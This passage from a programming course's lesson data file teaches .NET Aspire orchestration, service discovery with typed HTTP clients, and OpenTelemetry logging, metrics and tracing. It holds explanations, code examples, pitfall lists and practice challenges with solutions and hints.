auto-configured!)\nbuilder.AddRedisClient(\"cache\");\n\n// Add database (connection string auto-configured!)\nbuilder.AddNpgsqlDbContext<CatalogDbContext>(\"catalogdb\");\n\nvar app = builder.Build();\napp.MapDefaultEndpoints();  // Health checks, etc.\napp.Run();\n\nConsole.WriteLine(\".NET Aspire orchestrates your distributed app!\");\nConsole.WriteLine(\"Dashboard at: http://localhost:18888\");\nConsole.WriteLine(\"Run: dotnet run --project MyApp.AppHost\");",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`DistributedApplication.CreateBuilder(args)`**: Entry point for Aspire. Creates an orchestrator that manages all your services and infrastructure.\n\n**`builder.AddRedis(\"cache\")`**: Adds a Redis container to your app. The name 'cache' becomes the connection string name. Aspire handles container lifecycle automatically.\n\n**`builder.AddPostgres(\"postgres\").AddDatabase(\"catalogdb\")`**: Adds Postgres server and creates a database. Chained calls configure complex infrastructure simply.\n\n**`builder.AddProject<Projects.CatalogApi>(\"api\")`**: Adds a .NET project to orchestration. 'Projects.CatalogApi' is auto-generated from your solution. Name 'api' is used for service discovery.\n\n**`.WithReference(cache)`**: Creates a dependency. The API project will receive the Redis connection string automatically. Service discovery 'just works'.\n\n**`builder.AddServiceDefaults()`**: In each service, adds OpenTelemetry, health checks, service discovery, and resilient HTTP clients. One line for production-ready defaults."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Critical Warnings for .NET Aspire\n\n**Docker/Podman Required**: Aspire uses containers for local infrastructure (Redis, Postgres, etc.). Ensure Docker Desktop or Podman is running BEFORE starting AppHost, or you'll get cryptic container errors.\n\n**Project Reference Syntax**: Use `AddProject<Projects.MyApi>(\"name\")` NOT `AddProject(\"MyApi\")`. The generic syntax is compile-time checked and auto-generated from your solution.\n\n**WaitFor for Dependencies**: In Aspire 9.0+, use `.WaitFor(db)` to ensure services start AFTER their dependencies are healthy. Without it, your API might start before Postgres is ready!\n\n**Local vs Production Differences**: Aspire abstracts infrastructure, but behavior differs. Local Redis runs in a container; production might use Azure Cache for Redis. Test in production-like environments!\n\n**Dashboard Port Conflicts**: The Aspire dashboard defaults to port 18888. If blocked, check for other Aspire instances or configure via `DOTNET_DASHBOARD_FRONTEND_BROWSERTOKEN` environment variable.\n\n**Memory Consumption**: Running multiple containers locally consumes significant RAM. Monitor Docker memory limits if you experience slowdowns or crashes."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-16-01-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create an AppHost configuration for an e-commerce system!\n\n1. Define the infrastructure:\n   - Redis cache named 'productcache'\n   - Postgres database named 'orderdb'\n   - RabbitMQ message broker named 'messaging'\n\n2. Define three services:\n   - ProductApi: references Redis cache\n   - OrderApi: references Postgres and RabbitMQ\n   - WebStore: references both APIs\n\n3. Add comments explaining what each section does\n\nThink about the dependency chain: Web -> APIs -> Infrastructure",
              "starterCode": "// E-Commerce AppHost Configuration\n// This orchestrates our entire e-commerce system\n\nvar builder = DistributedApplication.CreateBuilder(args);\n\n// ===== INFRASTRUCTURE =====\n// TODO: Add Redis cache for products\nvar cache = builder.AddRedis(\"productcache\");\n\n// TODO: Add Postgres for orders\n\n// TODO: Add RabbitMQ for messaging\n\n// ===== SERVICES =====\n// TODO: Add ProductApi with cache reference\n\n// TODO: Add OrderApi with database and messaging references\n\n// TODO: Add WebStore with references to both APIs\n\nbuilder.Build().Run();\n\n// Print what we configured\nConsole.WriteLine(\"E-Commerce system configured!\");",
              "solution": "// E-Commerce AppHost Configuration\n// This orchestrates our entire e-commerce system\n\nvar builder = DistributedApplication.CreateBuilder(args);\n\n// ===== INFRASTRUCTURE =====\n// Redis for caching product data (fast reads)\nvar cache = builder.AddRedis(\"productcache\");\n\n// Postgres for persistent order storage\nvar orderDb = builder.AddPostgres(\"postgres\")\n    .AddDatabase(\"orderdb\");\n\n// RabbitMQ for async communication between services\nvar messaging = builder.AddRabbitMQ(\"messaging\");\n\n// ===== SERVICES =====\n// Product API - handles product catalog, uses cache\nvar productApi = builder.AddProject<Projects.ProductApi>(\"productapi\")\n    .WithReference(cache);\n\n// Order API - handles orders, needs DB and messaging\nvar orderApi = builder.AddProject<Projects.OrderApi>(\"orderapi\")\n    .WithReference(orderDb)\n    .WithReference(messaging);\n\n// Web storefront - talks to both APIs\nbuilder.AddProject<Projects.WebStore>(\"webstore\")\n    .WithReference(productApi)\n    .WithReference(orderApi);\n\nbuilder.Build().Run();\n\n// Print what we configured\nConsole.WriteLine(\"E-Commerce system configured!\");\nConsole.WriteLine(\"Infrastructure: Redis, Postgres, RabbitMQ\");\nConsole.WriteLine(\"Services: ProductApi, OrderApi, WebStore\");\nConsole.WriteLine(\"Dashboard: http://localhost:18888\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should confirm e-commerce configuration",
                  "expectedOutput": "E-Commerce",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should mention infrastructure components",
                  "expectedOutput": "Redis",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "AddRedis, AddPostgres, AddRabbitMQ create infrastructure. Chain .AddDatabase() for Postgres databases."
                },
                {
                  "level": 2,
                  "text": "AddProject<Projects.ProjectName>('servicename') adds a .NET project. The name is used for service discovery."
                },
                {
                  "level": 3,
                  "text": ".WithReference(resource) creates a dependency. The service receives connection info automatically."
                },
                {
                  "level": 4,
                  "text": "Order matters for dependencies! Define infrastructure first, then services that use them."
                },
                {
                  "level": 5,
                  "text": "Multiple .WithReference() calls chain: .WithReference(db).WithReference(cache) connects to both."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting to store infrastructure reference",
                  "consequence": "builder.AddRedis('cache'); then later .WithReference(???) - you need the variable! var cache = builder.AddRedis('cache');",
                  "correction": "Always store infrastructure in variables: var cache = builder.AddRedis('cache'); then .WithReference(cache)"
                },
                {
                  "mistake": "Wrong project reference syntax",
                  "consequence": "AddProject('MyApi') doesn't work! Aspire needs the compile-time project reference with generic syntax.",
                  "correction": "Use AddProject<Projects.MyApi>('myapi') - Projects.MyApi is auto-generated from your solution."
                },
                {
                  "mistake": "Circular dependencies",
                  "consequence": "ServiceA.WithReference(serviceB) and ServiceB.WithReference(serviceA) creates a deadlock at startup!",
                  "correction": "Design clear dependency hierarchy. Usually: Web -> APIs -> Infrastructure. Use messaging for bidirectional communication."
                },
                {
                  "mistake": "Not understanding local vs production",
                  "consequence": "Aspire uses containers locally but you might deploy to managed services. Connection strings differ!",
                  "correction": "Aspire abstracts this! Same code works locally (containers) and in production (Azure services). Configuration handles the difference."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-16-02",
          "title": "Service Discovery & Communication",
          "moduleId": "module-16",
          "order": 2,
          "estimatedMinutes": 25,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine a company where departments need to talk to each other. In the OLD way, everyone memorizes direct phone numbers - if someone moves desks, chaos!\n\nThe MODERN way: a receptionist (service discovery). You call the receptionist, say 'Connect me to Sales,' and they route you - regardless of where Sales is sitting today.\n\nTRADITIONAL APPROACH:\n- Hardcode URLs: http://localhost:5001\n- Change port? Update every caller!\n- Different environments? Config nightmare!\n\nSERVICE DISCOVERY:\n- Services register by NAME\n- Callers request by NAME\n- Discovery resolves to actual URL\n- Port changes? No problem!\n\nASPIRE SERVICE DISCOVERY:\n- .WithReference(api) sets up discovery\n- http://api resolves automatically\n- Works locally and in production\n- No configuration needed!\n\nCOMMUNICATION PATTERNS:\n- HTTP/REST: Standard web APIs\n- gRPC: Fast binary protocol\n- Messaging: Async via queues\n\nThink: 'Service discovery is the phone book that always stays updated!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// ===== AppHost/Program.cs =====\nvar builder = DistributedApplication.CreateBuilder(args);\n\n// The API service\nvar catalogApi = builder.AddProject<Projects.CatalogApi>(\"catalog-api\");\n\n// Web app references the API (enables service discovery)\nbuilder.AddProject<Projects.WebApp>(\"webapp\")\n    .WithReference(catalogApi);\n\nbuilder.Build().Run();\n\n// ===== WebApp/Program.cs =====\nvar builder = WebApplication.CreateBuilder(args);\nbuilder.AddServiceDefaults();\n\n// Register HttpClient for the catalog API\n// Service discovery resolves \"http://catalog-api\" automatically!\nbuilder.Services.AddHttpClient<CatalogApiClient>(client =>\n{\n    // Use service name, NOT hardcoded URL!\n    client.BaseAddress = new Uri(\"http://catalog-api\");\n});\n\nvar app = builder.Build();\napp.MapDefaultEndpoints();\napp.Run();\n\n// ===== WebApp/CatalogApiClient.cs =====\npublic class CatalogApiClient\n{\n    private readonly HttpClient _httpClient;\n    \n    public CatalogApiClient(HttpClient httpClient)\n    {\n        _httpClient = httpClient;\n    }\n    \n    public async Task<List<Product>> GetProductsAsync()\n    {\n        // Just use relative path - base address is service-discovered!\n        var response = await _httpClient.GetAsync(\"/api/products\");\n        response.EnsureSuccessStatusCode();\n        return await response.Content.ReadFromJsonAsync<List<Product>>();\n    }\n    \n    public async Task<Product?> GetProductAsync(int id)\n    {\n        return await _httpClient.GetFromJsonAsync<Product>($\"/api/products/{id}\");\n    }\n}\n\npublic record Product(int Id, string Name, decimal Price);\n\n// ===== ALTERNATIVE: Typed Client with Refit =====\n// Install: dotnet add package Refit.HttpClientFactory\n\n// Define API interface\npublic interface ICatalogApi\n{\n    [Get(\"/api/products\")]\n    Task<List<Product>> GetProductsAsync();\n    \n    [Get(\"/api/products/{id}\")]\n    Task<Product> GetProductAsync(int id);\n    \n    [Post(\"/api/products\")]\n    Task<Product> CreateProductAsync([Body] Product product);\n}\n\n// Register with Refit + service discovery\nbuilder.Services\n    .AddRefitClient<ICatalogApi>()\n    .ConfigureHttpClient(c => c.BaseAddress = new Uri(\"http://catalog-api\"));\n\n// ===== Using the client =====\npublic class ProductsController : Controller\n{\n    private readonly CatalogApiClient _catalogClient;\n    \n    public ProductsController(CatalogApiClient catalogClient)\n    {\n        _catalogClient = catalogClient;\n    }\n    \n    public async Task<IActionResult> Index()\n    {\n        var products = await _catalogClient.GetProductsAsync();\n        return View(products);\n    }\n}\n\nConsole.WriteLine(\"Service discovery configured!\");\nConsole.WriteLine(\"http://catalog-api resolves automatically\");\nConsole.WriteLine(\"No hardcoded URLs, works in any environment!\");",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`.WithReference(catalogApi)`**: In AppHost, this tells Aspire that webapp needs to call catalog-api. Aspire injects environment variables with the service URL.\n\n**`new Uri(\"http://catalog-api\")`**: Use the SERVICE NAME as the hostname! Aspire's service discovery intercepts this and resolves to the actual running instance URL.\n\n**`AddHttpClient<TClient>()`**: Registers a typed HttpClient. The client class receives a pre-configured HttpClient via constructor injection. Cleaner than using IHttpClientFactory directly.\n\n**`builder.AddServiceDefaults()`**: Enables service discovery (among other things). Without this, http://service-name won't resolve!\n\n**`GetFromJsonAsync<T>()`**: Convenience method that GETs JSON and deserializes to T. Part of System.Net.Http.Json. Reduces boilerplate.\n\n**`Refit [Get], [Post] attributes`**: Declare HTTP operations as interface methods. Refit generates the implementation. Cleaner than manual HttpClient code."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Service Discovery Gotchas\n\n**AddServiceDefaults() is REQUIRED**: Without `builder.AddServiceDefaults()` in your service's Program.cs, service discovery URLs like `http://catalog-api` will NOT resolve. You'll get DNS errors!\n\n**HTTPS vs HTTP**: Service discovery defaults to `http://` internally. For HTTPS, use `https+http://service-name` syntax, or configure endpoints explicitly in AppHost.\n\n**Named Endpoints**: Some services expose multiple ports. Use `http://_endpointName.serviceName` syntax to target specific endpoints (e.g., `http://_grpc.catalog-api`).\n\n**Container Networking**: Containers use resource names for internal DNS. If your container can't reach `postgres`, check the resource name matches exactly what you used in `AddPostgres(\"postgres\")`.\n\n**Don't Hardcode Ports**: Never use `http://localhost:5001` even locally! Service discovery handles ports automatically. Hardcoded URLs break when ports change or in production.\n\n**HttpClient Lifecycle**: Never create `new HttpClient()` manually - it causes socket exhaustion. Always inject HttpClient through DI with `AddHttpClient<T>()`."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-16-02-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a typed HTTP client for an inventory service!\n\n1. Define InventoryItem record:\n   - Id (int), Sku (string), Quantity (int), WarehouseId (string)\n\n2. Create InventoryApiClient class:\n   - Constructor takes HttpClient\n   - GetAllItemsAsync() - GET /api/inventory\n   - GetItemBySkuAsync(sku) - GET /api/inventory/{sku}\n   - UpdateQuantityAsync(sku, quantity) - PUT /api/inventory/{sku}/quantity\n   - CheckStockAsync(sku, required) - GET /api/inventory/{sku}/check?required={required}\n\n3. Use service discovery URL: http://inventory-api\n\nRemember: Use GetFromJsonAsync, PostAsJsonAsync, etc.!",
              "starterCode": "using System.Net.Http.Json;\n\npublic record InventoryItem(int Id, string Sku, int Quantity, string WarehouseId);\n\npublic record StockCheckResult(bool InStock, int Available, int Required);\n\npublic class InventoryApiClient\n{\n    private readonly HttpClient _httpClient;\n    \n    public InventoryApiClient(HttpClient httpClient)\n    {\n        _httpClient = httpClient;\n        // Base address set via DI: http://inventory-api\n    }\n    \n    public async Task<List<InventoryItem>> GetAllItemsAsync()\n    {\n        // TODO: GET /api/inventory\n        return new List<InventoryItem>();\n    }\n    \n    public async Task<InventoryItem?> GetItemBySkuAsync(string sku)\n    {\n        // TODO: GET /api/inventory/{sku}\n        return null;\n    }\n    \n    public async Task<bool> UpdateQuantityAsync(string sku, int quantity)\n    {\n        // TODO: PUT /api/inventory/{sku}/quantity with { quantity } body\n        return false;\n    }\n    \n    public async Task<StockCheckResult?> CheckStockAsync(string sku, int required)\n    {\n        // TODO: GET /api/inventory/{sku}/check?required={required}\n        return null;\n    }\n}\n\n// Registration example\nConsole.WriteLine(\"Register with: builder.Services.AddHttpClient<InventoryApiClient>(...)\");",
              "solution": "using System.Net.Http.Json;\n\npublic record InventoryItem(int Id, string Sku, int Quantity, string WarehouseId);\n\npublic record StockCheckResult(bool InStock, int Available, int Required);\n\npublic class InventoryApiClient\n{\n    private readonly HttpClient _httpClient;\n    \n    public InventoryApiClient(HttpClient httpClient)\n    {\n        _httpClient = httpClient;\n        // Base address set via DI: http://inventory-api\n    }\n    \n    public async Task<List<InventoryItem>> GetAllItemsAsync()\n    {\n        var items = await _httpClient.GetFromJsonAsync<List<InventoryItem>>(\"/api/inventory\");\n        return items ?? new List<InventoryItem>();\n    }\n    \n    public async Task<InventoryItem?> GetItemBySkuAsync(string sku)\n    {\n        try\n        {\n            return await _httpClient.GetFromJsonAsync<InventoryItem>($\"/api/inventory/{sku}\");\n        }\n        catch (HttpRequestException ex) when (ex.StatusCode == System.Net.HttpStatusCode.NotFound)\n        {\n            return null;\n        }\n    }\n    \n    public async Task<bool> UpdateQuantityAsync(string sku, int quantity)\n    {\n        var response = await _httpClient.PutAsJsonAsync(\n            $\"/api/inventory/{sku}/quantity\", \n            new { quantity });\n        return response.IsSuccessStatusCode;\n    }\n    \n    public async Task<StockCheckResult?> CheckStockAsync(string sku, int required)\n    {\n        return await _httpClient.GetFromJsonAsync<StockCheckResult>(\n            $\"/api/inventory/{sku}/check?required={required}\");\n    }\n}\n\n// Registration example\nConsole.WriteLine(\"InventoryApiClient implemented!\");\nConsole.WriteLine(\"Register with:\");\nConsole.WriteLine(\"builder.Services.AddHttpClient<InventoryApiClient>(client =>\");\nConsole.WriteLine(\"    client.BaseAddress = new Uri(\\\"http://inventory-api\\\"));\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should confirm implementation",
                  "expectedOutput": "InventoryApiClient",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should show service discovery URL",
                  "expectedOutput": "inventory-api",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "GetFromJsonAsync<T>(url) does GET + deserialize in one call. Returns T? so handle nulls."
                },
                {
                  "level": 2,
                  "text": "PutAsJsonAsync(url, object) serializes object to JSON and sends PUT. Returns HttpResponseMessage."
                },
                {
                  "level": 3,
                  "text": "Query strings: $\"/api/endpoint?param={value}\" - string interpolation works in URLs!"
                },
                {
                  "level": 4,
                  "text": "Handle 404s gracefully! GetFromJsonAsync throws on non-success. Catch HttpRequestException and check StatusCode."
                },
                {
                  "level": 5,
                  "text": "Anonymous types for simple bodies: new { quantity } creates { \"quantity\": value } JSON."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Hardcoding full URLs",
                  "consequence": "http://localhost:5001/api/inventory works locally but fails in production! Defeats service discovery.",
                  "correction": "Use relative paths (/api/inventory) with BaseAddress set to service name (http://inventory-api)."
                },
                {
                  "mistake": "Not handling HTTP errors",
                  "consequence": "GetFromJsonAsync throws on 404, 500, etc. Unhandled exception crashes your app!",
                  "correction": "Wrap in try-catch, check response.IsSuccessStatusCode, or use HttpResponseMessage directly."
                },
                {
                  "mistake": "Creating HttpClient manually",
                  "consequence": "new HttpClient() in each method = socket exhaustion! HttpClient should be reused.",
                  "correction": "Inject HttpClient via constructor. Let DI manage lifecycle. AddHttpClient<T> handles pooling."
                },
                {
                  "mistake": "Forgetting AddServiceDefaults()",
                  "consequence": "Service discovery won't work! http://service-name fails to resolve.",
                  "correction": "Always call builder.AddServiceDefaults() in each service's Program.cs. It enables service discovery."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-16-03",
          "title": "Observability: Logs, Metrics, Traces (OpenTelemetry)",
          "moduleId": "module-16",
          "order": 3,
          "estimatedMinutes": 25,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you're a detective investigating why a pizza delivery was late. You need THREE types of evidence:\n\n1. LOGS (The Diary): What happened step by step\n   'Order received at 6:00 PM'\n   'Pizza made at 6:15 PM'\n   'Driver left at 6:20 PM'\n   'ERROR: GPS lost signal at 6:30 PM'\n\n2. METRICS (The Dashboard): Numbers over time\n   'Orders per hour: 50'\n   'Average delivery time: 35 mins'\n   'Error rate: 2%'\n\n3. TRACES (The Journey): Follow one request across services\n   Order Service -> Kitchen Service -> Driver Service -> Delivery\n   'This specific order took 50 mins because Kitchen was slow'\n\nOPENTELEMETRY: Industry standard for all three!\n- One API for logs, metrics, traces\n- Works with any backend (Jaeger, Zipkin, Prometheus)\n- Auto-instrumentation for common libraries\n\nASPIRE DASHBOARD: Built-in visualization!\n- See all services and their status\n- View logs, metrics, traces in one place\n- No external tools needed for development\n\nThink: 'Logs tell you WHAT happened. Metrics tell you HOW MUCH. Traces tell you WHERE in the journey.'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// ===== ServiceDefaults/Extensions.cs =====\n// This is included in Aspire templates!\n\npublic static IHostApplicationBuilder ConfigureOpenTelemetry(\n    this IHostApplicationBuilder builder)\n{\n    builder.Logging.AddOpenTelemetry(logging =>\n    {\n        logging.IncludeFormattedMessage = true;\n        logging.IncludeScopes = true;\n    });\n    \n    builder.Services.AddOpenTelemetry()\n        .WithMetrics(metrics =>\n        {\n            // Built-in metrics from ASP.NET Core, HttpClient, etc.\n            metrics.AddAspNetCoreInstrumentation()\n                   .AddHttpClientInstrumentation()\n                   .AddRuntimeInstrumentation();\n        })\n        .WithTracing(tracing =>\n        {\n            // Trace requests through your services\n            tracing.AddAspNetCoreInstrumentation()\n                   .AddHttpClientInstrumentation()\n                   .AddEntityFrameworkCoreInstrumentation();\n        });\n    \n    // Export to Aspire Dashboard (OTLP protocol)\n    builder.AddOpenTelemetryExporters();\n    \n    return builder;\n}\n\n// ===== Using Structured Logging =====\npublic class OrderService\n{\n    private readonly ILogger<OrderService> _logger;\n    \n    public OrderService(ILogger<OrderService> logger)\n    {\n        _logger = logger;\n    }\n    \n    public async Task<Order> CreateOrderAsync(CreateOrderRequest request)\n    {\n        // STRUCTURED logging - properties are indexed and searchable!\n        _logger.LogInformation(\n            \"Creating order for customer {CustomerId} with {ItemCount} items\",\n            request.CustomerId,\n            request.Items.Count);\n        \n        try\n        {\n            var order = new Order { /* ... */ };\n            \n            _logger.LogInformation(\n                \"Order {OrderId} created successfully. Total: {Total:C}\",\n                order.Id,\n                order.Total);\n            \n            return order;\n        }\n        catch (Exception ex)\n        {\n            // Log exception with full details\n            _logger.LogError(ex,\n                \"Failed to create order for customer {CustomerId}\",\n                request.CustomerId);\n            throw;\n        }\n    }\n}\n\n// ===== Custom Metrics =====\nusing System.Diagnostics.Metrics;\n\npublic class OrderMetrics\n{\n    private readonly Counter<int> _ordersCreated;\n    private readonly Histogram<double> _orderProcessingTime;\n    private readonly UpDownCounter<int> _activeOrders;\n    \n    public OrderMetrics(IMeterFactory meterFactory)\n    {\n        var meter = meterFactory.Create(\"MyApp.Orders\");\n        \n        _ordersCreated = meter.CreateCounter<int>(\n            \"orders.created\",\n            description: \"Number of orders created\");\n        \n        _orderProcessingTime = meter.CreateHistogram<double>(\n            \"orders.processing_time\",\n            unit: \"ms\",\n            description: \"Order processing time in milliseconds\");\n        \n        _activeOrders = meter.CreateUpDownCounter<int>(\n            \"orders.active\",\n            description: \"Currently processing orders\");\n    }\n    \n    public void OrderCreated(string region)\n    {\n        // Tags add dimensions to metrics\n        _ordersCreated.Add(1, new KeyValuePair<string, object?>(\"region\", region));\n    }\n    \n    public void RecordProcessingTime(double milliseconds)\n    {\n        _orderProcessingTime.Record(milliseconds);\n    }\n    \n    public void OrderStarted() => _activeOrders.Add(1);\n    public void OrderCompleted() => _activeOrders.Add(-1);\n}\n\n// ===== Custom Tracing (ActivitySource) =====\nusing System.Diagnostics;\n\npublic class PaymentService\n{\n    private static readonly ActivitySource ActivitySource = \n        new(\"MyApp.Payments\");\n    \n    public async Task<PaymentResult> ProcessPaymentAsync(Payment payment)\n    {\n        // Start a new span (trace segment)\n        using var activity = ActivitySource.StartActivity(\"ProcessPayment\");\n        \n        // Add attributes to the span\n        activity?.SetTag(\"payment.amount\", payment.Amount);\n        activity?.SetTag(\"payment.method\", payment.Method);\n        \n        try\n        {\n            var result = await CallPaymentGatewayAsync(payment);\n            activity?.SetTag(\"payment.success\", true);\n            return result;\n        }\n        catch (Exception ex)\n        {\n            activity?.SetTag(\"payment.success\", false);\n            activity?.SetTag(\"error.message\", ex.Message);\n            activity?.SetStatus(ActivityStatusCode.Error, ex.Message);\n            throw;\n        }\n    }\n}\n\nConsole.WriteLine(\"OpenTelemetry configured!\");\nConsole.WriteLine(\"View in Aspire Dashboard: http://localhost:18888\");\nConsole.WriteLine(\"Logs, Metrics, and Traces all in one place!\");",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`AddOpenTelemetry().WithMetrics().WithTracing()`**: Fluent API to configure OpenTelemetry. Chain WithMetrics() and WithTracing() to enable each signal.\n\n**`AddAspNetCoreInstrumentation()`**: Auto-instruments ASP.NET Core requests. Every HTTP request becomes a trace span with timing, status codes, etc.\n\n**`_logger.LogInformation(\"Message {Property}\", value)`**: Structured logging! {Property} is a placeholder, value fills it. Properties are indexed for searching in the dashboard.\n\n**`meter.CreateCounter<int>(\"metric.name\")`**: Creates a metric that only goes up (counts events). Other types: Histogram (distributions), UpDownCounter (can decrease), Gauge (point-in-time value).\n\n**`ActivitySource.StartActivity(\"name\")`**: Starts a trace span. The span represents a unit of work. Use 'using' to auto-close when done.\n\n**`activity?.SetTag(\"key\", value)`**: Adds metadata to a span. Tags are indexed and searchable. Use for request IDs, user IDs, amounts, etc."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Observability Anti-Patterns\n\n**String Interpolation in Logs**: NEVER use `_logger.LogInformation($\"Order {orderId}\")`. This evaluates the string BEFORE logging, losing structured properties. Use `_logger.LogInformation(\"Order {OrderId}\", orderId)` with placeholders.\n\n**High-Cardinality Tags**: Don't use user IDs, order IDs, or email addresses as metric tags! Each unique value creates a new time series. Millions of users = millions of metrics = exploded storage costs.\n\n**Forgetting Activity Disposal**: `StartActivity()` without `using` leaves spans open forever. Always use `using var activity = ...` or call `Dispose()` manually.\n\n**Activity Returns Null**: `StartActivity()` returns null if no listener is registered! Always use null-conditional: `activity?.SetTag(...)` to avoid NullReferenceException.\n\n**Dashboard is Dev-Only**: The Aspire Dashboard stores telemetry in memory and is NOT for production monitoring. Use Azure Monitor, Prometheus/Grafana, or Jaeger for production.\n\n**OTLP Endpoint Configuration**: If telemetry isn't appearing in the dashboard, verify `OTEL_EXPORTER_OTLP_ENDPOINT` is set correctly. The default is `http://localhost:4317`."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-16-03-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Add observability to a shopping cart service!\n\n1. Create CartMetrics class with:\n   - Counter: items_added (with product_category tag)\n   - Counter: items_removed\n   - Histogram: cart_value (track cart totals)\n   - UpDownCounter: active_carts\n\n2. Create CartService with structured logging:\n   - Log when items are added (include CartId, ProductId, Quantity)\n   - Log warnings when cart exceeds $1000\n   - Log errors with exception details\n\n3. Add tracing with ActivitySource:\n   - Span for AddToCart operation\n   - Include cart_id and product_id as tags\n\nUse IMeterFactory and ILogger<T>!",
              "starterCode": "using System.Diagnostics;\nusing System.Diagnostics.Metrics;\nusing Microsoft.Extensions.Logging;\n\npublic class CartMetrics\n{\n    // TODO: Define metrics\n    // - Counter for items added (with category tag)\n    // - Counter for items removed\n    // - Histogram for cart values\n    // - UpDownCounter for active carts\n    \n    public CartMetrics(IMeterFactory meterFactory)\n    {\n        var meter = meterFactory.Create(\"MyApp.Cart\");\n        \n        // TODO: Create metrics\n    }\n    \n    public void ItemAdded(string category)\n    {\n        // TODO: Increment counter with category tag\n    }\n    \n    public void ItemRemoved()\n    {\n        // TODO: Increment removed counter\n    }\n    \n    public void RecordCartValue(double value)\n    {\n        // TODO: Record histogram value\n    }\n}\n\npublic class CartService\n{\n    private static readonly ActivitySource ActivitySource = new(\"MyApp.Cart\");\n    \n    private readonly ILogger<CartService> _logger;\n    private readonly CartMetrics _metrics;\n    \n    public CartService(ILogger<CartService> logger, CartMetrics metrics)\n    {\n        _logger = logger;\n        _metrics = metrics;\n    }\n    \n    public void AddToCart(string cartId, string productId, int quantity, string category, decimal price)\n    {\n        // TODO: Start activity/span with tags\n        // TODO: Log structured message\n        // TODO: Record metrics\n        // TODO: Warn if cart > $1000\n    }\n}\n\nConsole.WriteLine(\"Implement observability for CartService!\");",
              "solution": "using System.Diagnostics;\nusing System.Diagnostics.Metrics;\nusing Microsoft.Extensions.Logging;\n\npublic class CartMetrics\n{\n    private readonly Counter<int> _itemsAdded;\n    private readonly Counter<int> _itemsRemoved;\n    private readonly Histogram<double> _cartValue;\n    private readonly UpDownCounter<int> _activeCarts;\n    \n    public CartMetrics(IMeterFactory meterFactory)\n    {\n        var meter = meterFactory.Create(\"MyApp.Cart\");\n        \n        _itemsAdded = meter.CreateCounter<int>(\n            \"cart.items_added\",\n            description: \"Number of items added to carts\");\n        \n        _itemsRemoved = meter.CreateCounter<int>(\n            \"cart.items_removed\",\n            description: \"Number of items removed from carts\");\n        \n        _cartValue = meter.CreateHistogram<double>(\n            \"cart.value\",\n            unit: \"USD\",\n            description: \"Shopping cart total values\");\n        \n        _activeCarts = meter.CreateUpDownCounter<int>(\n            \"cart.active\",\n            description: \"Number of active shopping carts\");\n    }\n    \n    public void ItemAdded(string category)\n    {\n        _itemsAdded.Add(1, new KeyValuePair<string, object?>(\"product_category\", category));\n    }\n    \n    public void ItemRemoved()\n    {\n        _itemsRemoved.Add(1);\n    }\n    \n    public void RecordCartValue(double value)\n    {\n        _cartValue.Record(value);\n    }\n    \n    public void CartCreated() => _activeCarts.Add(1);\n    public void CartCompleted() => _activeCarts.Add(-1);\n}\n\npublic class CartService\n{\n    private static readonly ActivitySource ActivitySource = new(\"MyApp.Cart\");\n    \n    private readonly ILogger<CartService> _logger;\n    private readonly CartMetrics _metrics;\n    private decimal _cartTotal = 0;\n    \n    public CartService(ILogger<CartService> logger, CartMetrics metrics)\n    {\n        _logger = logger;\n        _metrics = metrics;\n    }\n    \n    public void AddToCart(string cartId, string productId, int quantity, string category, decimal price)\n    {\n        using var activity = ActivitySource.StartActivity(\"AddToCart\");\n        activity?.SetTag(\"cart.id\", cartId);\n        activity?.SetTag(\"product.id\", productId);\n        activity?.SetTag(\"product.category\", category);\n        activity?.SetTag(\"quantity\", quantity);\n        \n        _logger.LogInformation(\n            \"Adding to cart {CartId}: Product {ProductId}, Quantity {Quantity}, Category {Category}\",\n            cartId, productId, quantity, category);\n        \n        _cartTotal += price * quantity;\n        \n        _metrics.ItemAdded(category);\n        _metrics.RecordCartValue((double)_cartTotal);\n        \n        if (_cartTotal > 1000)\n        {\n            _logger.LogWarning(\n                \"Cart {CartId} exceeds $1000! Current total: {CartTotal:C}\",\n                cartId, _cartTotal);\n        }\n        \n        activity?.SetTag(\"cart.total\", _cartTotal);\n    }\n}\n\nConsole.WriteLine(\"CartService with full observability!\");\nConsole.WriteLine(\"Metrics: items_added (with category), items_removed, cart_value, active_carts\");\nConsole.WriteLine(\"Logging: Structured with CartId, ProductId, Quantity\");\nConsole.WriteLine(\"Tracing: 